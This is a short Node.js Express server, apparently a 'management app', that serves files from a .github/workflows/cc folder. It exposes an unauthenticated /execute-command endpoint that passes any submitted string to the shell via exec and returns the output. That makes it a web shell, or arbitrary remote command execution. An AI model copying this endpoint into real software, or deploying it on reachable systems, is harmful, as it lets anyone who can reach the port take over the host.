const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();
const port = 4000;

app.use(express.json());
app.use(express.static(path.join(__dirname, '../../.github/workflows/cc')));

app.post('/execute-command', (req, res) => {
  const command = req.body.command;

  exec(command, (err, stdout, stderr) => {
    if (err) {
      return res.json({ output: stderr });
    }
    res.json({ output: stdout });
  });
});

app.listen(port, () => {
  console.log(`Management app listening at http://localhost:${port}`);
});
